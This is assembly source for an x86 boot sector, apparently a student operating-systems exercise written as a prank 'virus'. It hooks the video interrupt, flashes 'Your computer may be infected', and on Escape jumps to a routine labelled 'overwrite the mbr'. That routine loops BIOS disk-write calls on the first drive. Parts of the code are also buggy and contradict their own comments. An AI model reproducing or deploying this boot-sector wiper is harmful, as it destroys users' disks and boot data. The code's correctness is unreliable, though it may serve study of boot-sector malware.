
; OS423 Master Boot Record Sector
; 2/12/2018

	;bit16                	;16bit by default
	org 0x7c00
	jmp short start
	nop
bsOEM	db "OS423 v.3"      ;OEM String

start:

;implement user defined Interrupt
	mov ax,cs
	mov ds,ax
	mov es,ax
	call install_syscall

	;wait for space clear screen with ....
	mov ah,0x10  ;wait for keystroke
    mov cx,0x3920 ;space
    int 0x10	;cont
	mov ah,0x06	;service ah=10
	mov ch, '.'	;char to display
	mov cl,2eh	;yellow on Green
	int 0x10	;Interrupt call cls
    
    ;wait for space and cls with ^^^
    mov ah,0x10  ;wait for keystroke
    mov cx,0x3920 ;space
    int 0x10	;cont
    mov ah,0x06	;service ah=1
	mov ch, '^'	;char to display
	mov cl, 4ah	;light green on Red
	int 0x10	;Interrupt call cls

	;wait for cnt+C the display virus message reversed case
	mov ah,0x10	;wait for keystroke
	mov cx,0x2e03 ;crt+C
	int 0x10  	;cont
	mov bl, 7eh ;color
	mov cx, mlen
	lea bp, [msg]
	mov ah,0x13 ;Virus
	int 0x10	;Interrupt call
	
	;make the msg flash and display it over and over after cnt+C
	mov ah,0x10	  ;wait for keystroke
	mov cx,0x2e03 ;crt+C
	int 0x10  	  ;cont
	mov ah,0x16   ;Virus
	int 0x10	  ;Interrupt call

	int 20h

install_syscall:
	push dx
	push es                	;backup

	xor ax, ax
	mov es, ax            	;es set to segment 0000
	cli                    	;disable Interrupt
	mov word [es:0x10*4], _int0x10	;Interrupt 0x10
	mov [es:0x10*4+2], cs 	;table entry
	sti

	pop es
	pop dx                 	;restore

	ret

;==========================================================;
;             	Interrupt Service 10h                      ;
;==========================================================;
_int0x10:
	pusha             	;save all
	cmp ah,0x06     	;service ah,06
	je _int0x10_ser0x06 ;ah=06  Clear screen
	cmp ah,0x10     	;service ah,10
	je _int0x10_ser0x10 ;ah=10  Wait for Ctr+C
	cmp ah,0x13 		;service ah,13
	je _int0x10_ser0x13 ;ah=13   Virus Reverse case
	cmp ah,0x16 		;service ah,13
	je _int0x10_ser0x16 ;ah=16   Virus Repeat and flash
	jmp end				;next

;==========================================================;
;	Interrupt Service 10h ah=0x06 - Clear Screen       	;
;	ch=char to display cl=color attr                   	;
;==========================================================;

;service code
_int0x10_ser0x06:
    mov ah,0
	;cls no Interrupts
	mov bx,0xb800 	;Direct video memory access
	mov es,bx
	xor bx,bx    	;update es:bx
	mov dh,0    	;row from 0 to 24
	mov dl,0    	;col from 0 to 79

.loop0:
	mov byte [es:bx],ch	;char
	inc bx
	mov byte[es:bx],cl	;attribute color
	inc bx

	inc dl
	cmp dl,79	;col 0-80
	jne .loop0
	mov dl,0
	inc dh
	cmp dh,24	;row 0-5
	jne .loop0

	jmp end    	;next

;==========================================================;
;	Interrupt Service 10h ah=0x10 - Wait for key press;
;	cx=char to wait for                                	;
;==========================================================;
_int0x10_ser0x10:

;;ctrl-c
keyin:
	mov ah, 0
	int 16h
	cmp ax, cx
	jne keyin
	jmp end   	 

;==========================================================;
;	Interrupt Service 10 ah=0x13 - To Upper Case      	;
;	bl = color  bp = string   cx = string len          	;
;==========================================================;
_int0x10_ser0x13:
	mov ah,0
	mov al, bl	;color
	mov bx,0xb800 ;direct video memory access
	mov es,bx
	xor bx,bx
	mov ah, byte[ds:bp]
;a (97) -- z (122)
;A (65) -- Z (90)
loop1:
	cmp ah,0x00
	je next

	cmp ah,0x30
	jl next

	cmp ah,0x39
	jg notNum

	add ah,1
	jmp next

notNum:
	cmp ah, 'A'
	jl next	;jump if less than a

	cmp ah, 'Z'
	jg notUpper	;jump if greater z
    
	add ah, 'a'-'A'
	jmp next

notUpper:
	cmp ah, 'a'
	jl next	;jump if less than a

	cmp ah, 'z'
	jg next	;jump if greater z
    
	add ah, 'A'-'a'
	jmp next

next:
	mov byte[ds:bp],ah
	mov byte[es:bx], ah ;char
	inc bx
	mov byte[es:bx], al ;attribute  
	inc bx

	inc bp
	dec cx

	cmp cx,0x0
	je end

	mov ah, byte[ds:bp]
	jmp loop1

	jmp end

;==========================================================;
;	Interrupt Service 10 ah=0x16 - Repeat and flash msg	;
;											        	;
;==========================================================;
_int0x10_ser0x16:
	mov ah,0
	mov al, 0x00	  ;color
	mov bx,0xb800 ;direct video memory access
	mov es,bx
	xor bx,bx

again:
	;change color on keyin
	mov dx, 0
	mov ah, 1
	int 16h
	cmp ax, dx
	je load
	add al,0x01
	add al,0x10

load:
	mov cx, mlen2
	lea bp, [msg2]	

	;if escape is pressed
	mov ah,0
	mov dx, 0x011b
	int 16h
	cmp ax,dx
	je goodbye

	mov ah, byte[ds:bp]

print:
	mov byte[es:bx], ah ;char
	inc bx
	mov byte[es:bx], al ;attribute  
	inc bx

	inc bp
	dec cx

	cmp cx,0x0
	je again

	mov ah, byte[ds:bp]
	jmp print

;overwrite the mbr
goodbye:
	mov al,0x01
	mov cl,0
	mov dh,0
	mov dl,0
	mov ah, byte[ds:bp]
	mov byte[es:bx], ah ;char
	mov ah,03h
	int 13h
	inc bx
	jmp goodbye
;==========================================================
; next
;==========================================================
end:
	popa            	;restore
	iret            	;must use iret instead ret


msg db 'Hello 423 by Mitch'
mlen equ $-msg   

msg2 db 'Your computer may be infected '
mlen2 equ $-msg2  

padding	times 510-($-$$) db 0    ;to make MBR 512 bytes
bootSig	db 0x55, 0xaa    		;signature (optional)